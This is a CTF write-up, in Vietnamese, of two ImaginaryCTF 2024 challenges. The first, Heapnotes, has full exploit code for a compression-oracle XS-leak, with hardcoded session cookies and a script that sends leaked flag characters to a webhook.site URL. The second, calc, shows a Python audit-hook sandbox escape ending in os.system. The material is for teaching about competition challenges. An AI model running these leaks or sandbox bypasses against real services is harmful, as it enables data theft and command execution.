---
title: "ImaginaryCTF 2024"
description: "Quick note about some nice challenges"
summary: "Quick note about some nice challenges"
categories: ["Writeup"]
tags: ["Web", "Misc"]
#externalUrl: ""
date: 2024-04-27
draft: false
authors:
  - Shin24
---

Vừa rồi mình có chơi ImaginaryCTF với CoSGang và giành được thứ hạng **#6**

![image](https://github.com/user-attachments/assets/d1b460fa-18e5-47d4-99ba-6a788e763d70)

Mình cùng anh **@AP** đã thành công clear toàn bộ các challenge web năm nay, sau đây là writeup của 2 bài khá hay mà mình đã làm (bài `calc` thì mình không solve được)

![image](https://github.com/user-attachments/assets/c8a937ad-613e-477d-adf6-a708408d3253)

![image](https://github.com/user-attachments/assets/f3b60992-a02d-465e-8a6c-0f0e8d19b517)

## Heapnotes 

Ở bài này ta sẽ có một ứng dụng để lưu lại các note ta đã viết, flag nằm trong username của bot, bot sẽ login rồi sau đó truy cập vào link của ta

### Solution 
Đầu tiên thì khi truy cập vào endpoint `/note/<id>`, username sẽ được gói vào cùng object với nội dung note, `JSON.dumps`, zlib compress, encrypt, hex digest rồi sau đó lấy làm id để redirect đến endpoint `/render/<data>/<key>`. Lúc đang bí thì mình nhớ lại có một lần ngồi xem qua thuật toán zlib, về cơ bản thì compression là để data trở nên ngắn hơn để việc truyền tải nhanh hơn, vậy liệu có cách để somehow oracle được từng ký tự của flag thông qua độ dài không nhỉ? Lúc này thì ta có 1 yếu tố quan trọng là ta kiểm soát được độ dài của URI thông qua param `<key>`, về cơ bản thì thuật toán encrypt sử dụng dựa trên việc XOR các ký tự của data với key

```py
def encrypt(pt, key):
    ct = []
    for i in range(len(pt)):
        ct.append(pt[i] ^ key[i % len(key)])
    return bytes(ct)
```

XOR với null thì data không đổi, do đó ta có thể pad bao nhiêu nullbyte tùy ý, control được URI length thì ta chỉ cần check xem điều kiện length của data (chứa flag) ra sao nữa là được. 

![image](https://github.com/user-attachments/assets/6d4760ca-c892-4e9f-9ad1-c90ef70f3b7f)

Hiểu đơn giản là nếu đoạn data chưa từng xuất hiện trước đó thì zlib có cách nào để compress nó được, dẫn đến việc output sẽ dài hơn bình thường. Tiếp theo ta chỉ cần tìm độ dài lớn nhất của URI mà WSGI cho phép, pad nullbyte sao cho URI lúc đúng vừa bằng con số đó là được, ta có thể leak xem ta cần pad bao nhiêu nullbyte bằng cách tương tự, pad nullbyte tăng dần cho đến khi nó lỗi là tìm ra. 

Exploit:

server.js (dùng để tạo note và trả về cho exploit)

```js
const express = require('express')

const app = express()
const port = 3000
const https = require('https');

const httpsAgent = new https.Agent({
      rejectUnauthorized: false,
});


// const URL = "https://localhost:13337/create"
const URL = "https://heapnotes.chal.imaginaryctf.org/create"

app.use((req, res, next) => {
  res.append('Access-Control-Allow-Origin', ['*']);
  res.append('Access-Control-Allow-Methods', 'GET,PUT,POST,DELETE');
  res.append('Access-Control-Allow-Headers', 'Content-Type');
  next();
});

function gen_key(num) {
  return "00".repeat(parseInt(num));
} 

app.get('/', async (req, res) => {
  console.log(req.query.content)
  // res.send(await create_note(req.query.content, req.query.number));
  const body = new FormData();

  body.append("content", req.query.content);
  body.append("key", gen_key(req.query.number))
  let data = await fetch(URL, {
    method: "POST",
    body,
    headers: {
      "Cookie": "session=.eJwlzjEOwzAIAMC_MHcAxxicz0QYsNrVaaaqf2-k7jfcB4658nzC_l5XPuB4BexA6ZJM3YRFu802McOzIovEJOMapdWOOkbkwBFjSvTqsZVoKIw0LFt3xOY39w2L6JSm3p25YBRzctXIWoxpthCnzjrQrBIz3JHrzPXfFIHvD0eWMCs.Zpufcw.g2mqz0Ah49J2J-wJwlFWQPu9EvQ"
      // "Cookie": "session=.eJwlzjEOwzAIAMC_eO5ggwGTz0RgsNo1aaaqf2-k7jfcp-zryPNZtvdx5aPsryhb8aFhiuzSggdI6OKhpr4oGCbXNV2okUhHFFR2y9uvLp2oxhpVDYU4FDIFcsRAjsasbmxJ0HqVaIGzVkyFSO2kPsUMW5qVO3Kdefw3UL4_mYUvCQ.Zpugag.PEdh2iXAbVSlzkLutxoFtxcwiFA"
    },
    agent: httpsAgent
  });

  data = await data.text();
  res.send(data);
})

app.listen(port, () => {
  console.log(`Example app listening on port ${port}`)
})
```

leak_len.html (để leak xem cần pad bao nhiêu nullbyte)

```html
<body></body>

<script>
    // const target = "https://localhost:13337/";
    const target = "https://heapnotes.chal.imaginaryctf.org";
    const charset = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!@_-{}~().,:[]=/"
    let PAD = "";
    const URI_MAX_LENGTH = 65543-22;
    const the_URL = `/render/`
    const CSRF_ENDPOINT = `${target}/note/`;
    let BASE_LENGTH = 138;
    let load_ok = false;

    function get_key_num() {
        return (URI_MAX_LENGTH-the_URL.length-BASE_LENGTH)/2
    }

    async function createNote(c) {
        let content = PAD+c;
        let num = get_key_num();
        let noteid = await fetch(`https://feba087cf2d4863ced81fadb6f4e2da8.serveo.net/?content=${content}&number=${num}`);
        return await noteid.text();
    }

    async function sleep(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }


    async function exploit() {
        while (true) {
            let noteid = await createNote("A");
            console.log("noteid: " + noteid);
            const attack = CSRF_ENDPOINT + noteid;
            
            const ifrm = document.createElement("object");
            ifrm.data = attack;
            ifrm.onload=() => {
                load_ok = true;
            };

            document.body.appendChild(ifrm);

            await sleep(1000);

            if (!load_ok) {
                console.log(BASE_LENGTH);
                BASE_LENGTH += 2;
                fetch(`https://webhook.site/a4ac2867-f495-4664-8d5a-95159b933fec/?leak_len=${BASE_LENGTH}&notfinal`, {mode: "no-cors"});
            } else 
                fetch(`https://webhook.site/a4ac2867-f495-4664-8d5a-95159b933fec/?leak_len=${BASE_LENGTH}`, {mode: "no-cors"});
                break;
            }

            load_ok = false;
            document.body.removeChild(ifrm);
        }
        
    exploit();
    
</script>
```

Final exploit:

```html
<body></body>

<script>
    // const target = "https://localhost:13337/";
    const target = "https://heapnotes.chal.imaginaryctf.org";
    const charset = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_@:}"
    let FLAG = "ictf{";
    const CHROME_URI_MAX_LENGTH = 65543-21;
    const the_URL = `/render/`
    const CSRF_ENDPOINT = `${target}/note/`;
    let BASE_LENGTH = 140;
    // let BASE_LENGTH = 120;
    let load_ok = false;

    function get_key_num() {
        return (CHROME_URI_MAX_LENGTH-the_URL.length-BASE_LENGTH)/2
    }

    async function createNote(c) {
        let content = FLAG+c;
        let num = get_key_num();
        let noteid = await fetch(`https://2ebf9157ccf7c280567edb99fd2be7db.serveo.net/?content=${content}&number=${num}`);
        return await noteid.text();
    }

    async function sleep(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }


    async function exploit() {
        const ifrm = [];
        let i = 0;
        while (FLAG.substr(-1) != "}") {
            for (c of charset) {
                let noteid = await createNote(c);
                // console.log("noteid: " + noteid);
                const attack = CSRF_ENDPOINT + noteid;
                
                ifrm.push(document.createElement("object"));
                ifrm[i].data = attack;
                ifrm[i].setAttribute("data-c", c)
                ifrm[i].onload=(e) => {
                    FLAG = FLAG + e.target.getAttribute("data-c");
                    console.log(FLAG);
                    fetch("https://webhook.site/a4ac2867-f495-4664-8d5a-95159b933fec/?leak="+FLAG, {mode:"no-cors"});
                };

                // console.log("test char => " + c);
                document.body.appendChild(ifrm[i]);
                i += 1;

            }
        }
        
    }

    exploit();
    
</script>
```

FLAG: `ictf{compress_n_xsleak_9b53be55}`

## calc

```
#!/usr/bin/env python3
from sys import addaudithook
from os import _exit
from re import match


def safe_eval(exit, code):
    def hook(*a):
        exit(0)

    def dummy():
        pass

    dummy.__code__ = compile(code, "<code>", "eval")
    addaudithook(hook)
    return dummy()


if __name__ == "__main__":
    expr = input("Math expression: ")
    if match(r"[0-9+\-*/]+", expr):
        print(safe_eval(_exit, expr))
    else:
        print("Do you know what is a calculator?")
```

pyjail i guess... Context là thường các hàm chạy các tác vụ về file, chạy command, fork, ... nói chung là các tác vụ nguy hiểm thì python sẽ gọi thêm 1 hàm `sys.audit` (đối với high level API) và `PySys_Audit` (đối với low level API a.k.a C) để trigger một audit event, author thực hiện hook vào các event này và cho exit, nghĩa là ta gần như sẽ không thể import, chạy command, ghi file, ... Full at: https://docs.python.org/3/library/audit_events.html

![image](https://github.com/user-attachments/assets/c645c6e4-fe2d-42c5-a258-792edb046037)

Đầu tiên thì vì `safe_eval` sẽ nhận một callback là `exit` nên mình tìm xem có cách nào để modify lại cái `exit` này không, thì với cách thông thường mình thấy là không làm được, mình bắt đầu chuyển sang hướng khác là vét source xem có API nào bị thiếu audit call không, sau vài tiếng dive source thì mình tìm được hàm `do_fork_exec`, một low level API không có audit call, API này cũng được expose lên high level API trong module `_posixsubprocess`

```C
do_fork_exec(char *const exec_array[],
             char *const argv[],
             char *const envp[],
             const char *cwd,
             int p2cread, int p2cwrite,
             int c2pread, int c2pwrite,
             int errread, int errwrite,
             int errpipe_read, int errpipe_write,
             int close_fds, int restore_signals,
             int call_setsid, pid_t pgid_to_set,
             gid_t gid,
             Py_ssize_t extra_group_size, const gid_t *extra_groups,
             uid_t uid, int child_umask,
             const void *child_sigmask,
             int *fds_to_keep, Py_ssize_t fds_to_keep_len,
             PyObject *preexec_fn,
             PyObject *preexec_fn_args_tuple)
{
...

child_exec(exec_array, argv, envp, cwd,
               p2cread, p2cwrite, c2pread, c2pwrite,
               errread, errwrite, errpipe_read, errpipe_write,
               close_fds, restore_signals, call_setsid, pgid_to_set,
               gid, extra_group_size, extra_groups,
               uid, child_umask, child_sigmask,
               fds_to_keep, fds_to_keep_len,
               preexec_fn, preexec_fn_args_tuple);
```

`child_exec` sẽ call đến `execve`, chuẩn rồi, nhưng giờ vấn đề là tìm cách reach được đến thằng này, sau vài tiếng nữa thì mình vẫn không tìm ra cách để reach đến nó, các cách mình đã thử:
- Dùng `__import__('sys').modules` (yes, ta không thể import, nhưng vì module `sys` đã được import nên nó được cache lại, vì đoạn lấy cache thì chưa đến lúc gọi `sys.audit` nên it's fine ) để check trong cache các module đã được load => không có
- Dùng `sys.modules` để reach đến BuiltinImporter nhằm load các module builtin => trong danh sách các module builtin của 3.12 không có `_posixsubprocess` (hay module nào có thể reach đến nó)
- Dùng `sys.modules` reach đến FrozenImporter => y như BuiltinImport
- Vét hết trong các cached modules để tìm xem có module nào reach được đến đó không => không có

Bí một hồi thì mình tìm ra một pull request của python `https://github.com/python/cpython/issues/115322`, PR này của một trong các author của giải (không phải của bài này) nên mình cảm thấy pretty sure là nó sẽ liên quan. Thêm nữa một trong các hàm mà author đề cập cũng là hàm mà mình tìm ra

![image](https://github.com/user-attachments/assets/7f5c6d31-30cc-4656-bd4c-1f74c87343c2)

Vì tìm ra được các cách khác để bypass qua `sys.audit` như `readline`, `_ctypes.CFuncPtr` nên mình dồn chút sức tàn còn lại để lặp lại những điều trên kia với 2 thằng này, đến cuối cùng thì vẫn tạch hết. Hôm sau thì mình đọc writeup của author, ông ấy cũng dùng cách modify `exit` nhưng thông qua việc trigger signal và truy xuất đến closure của `safe_eval` để sửa, mình sẽ giải thích về cách này

### Closure

Một cơ chế để ghi nhớ các biến bên trong scope của một function, cho phép function truy cập vào các biến trong scope của nó ngay cả khi nó được invoke ở nơi ngoài scope của nó.

```py
def safe_eval(exit, code):
    def hook(*a):
        exit(1)
```

Như ở trên thì closure của `hook` sẽ chứa `code` và `exit`, vậy nếu có thể truy cập vào closure của `hook` ta sẽ có thể sửa được `exit` trỏ đến một function khác. Khi mình thử cách này thì mình không tìm được cách nào để truy xuất đến `hook` cả, execute context của ta là ở hàm `dummy`, tuy nhiên thì không có `self` vì đây không phải là class nên mình cũng chẳng biết làm thế nào

### Author's solution

Cách làm của tác giả là register một signal handler (why no `sys.audit`?) và trigger một signal (why no `sys.audit`???), tham số của signal handler thì đầu tiên là signal number và tiếp theo là signal frame (khi signal được trigger ta cần có stack frame lúc signal trigger để handle error). Với signal frame ta sẽ truy cập được vào frame của `hook` và chỉnh sửa `exit`

```py
frame.f_back.f_locals['hook'].__closure__[0].__setattr__('cell_contents', lambda a: 1)
```
`cell_contents` là data của closure đó, trong `hook` chỉ có một biến được dùng là `exit` (`a` là parameter) do đó `__closure__[0].call_contents` sẽ là `exit`

Payload của author: 

```py
0,(s:=__import__('sys').modules['_signal'],s.signal(2,lambda a,b:b.f_back.f_locals['hook'].__closure__[0].__setattr__('cell_contents',lambda x:0)),s.raise_signal(2),__import__('os').system('id'))
```


